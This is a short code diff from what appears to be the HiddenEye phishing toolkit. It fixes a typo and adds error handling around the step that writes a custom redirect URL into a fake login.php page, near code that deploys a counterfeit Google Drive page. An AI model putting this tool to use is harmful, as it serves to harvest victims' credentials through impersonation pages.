@@ -356,7 +356,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         webpage_set('WebPages/TOOLS/gdrive', "Server/www/")
         print(localization.lang_start_phishing_page["https_suggestion"])
         print(localization.lang_start_phishing_page["gdrive_suggestion"])
-        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
+        input(localization.lang_start_phishing_page["press_enter_to_continue_if_setup_correctly"])
 
     else:
         run_command('clear')
@@ -401,9 +401,17 @@ def enter_custom_redirecting_url():  # Question where user can input custom web-
         f.close()
 
     else:
-        with open('Server/www/login.php') as f:
-            read_data = f.read()
-        c = read_data.replace('<CUSTOM>', custom)
-        f = open('Server/www/login.php', 'w')
-        f.write(c)
-        f.close()
+        try:
+            with open('Server/www/login.php') as f:
+                read_data = f.read()
+            c = read_data.replace('<CUSTOM>', custom)
+            f = open('Server/www/login.php', 'w')
+            f.write(c)
+            f.close()
+        except FileNotFoundError:
+            run_command("clear")
+            print(global_localization.hidden_eye_logo)
+            print(global_localization.official_website_link)
+            print(global_localization.by_darksec)
+            print("[^] ERROR: Please make sure your folder contains a valid login.php file.")
+            exit()
